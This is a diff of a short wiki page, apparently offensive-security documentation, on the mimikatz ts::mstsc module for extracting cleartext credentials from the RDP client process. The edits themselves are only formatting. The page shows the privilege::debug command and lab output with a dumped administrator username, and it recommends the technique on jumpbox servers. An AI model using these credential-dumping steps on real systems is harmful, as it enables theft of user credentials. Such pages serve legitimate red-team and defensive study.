@@ -1,8 +1,8 @@
 # mstsc
 
-This module can be used to extract cleartext credentials from the mstsc process \(client side\)
+`ts::mstsc` can be used to extract cleartext credentials from the mstsc process (client side)
 
-```text
+```
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -27,5 +27,4 @@ RDmiUsername                              [wstring] 'hacklab\administrator'
 It must be noted that an RDP session must be running in order to retrieve credentials via `ts::mstsc`. It comes in handy in jumpbox servers!
 {% endhint %}
 
-_\(Demonstration target is a Windows 10 Pro\)_
-
+_(Demonstration target is a Windows 10 Pro)_
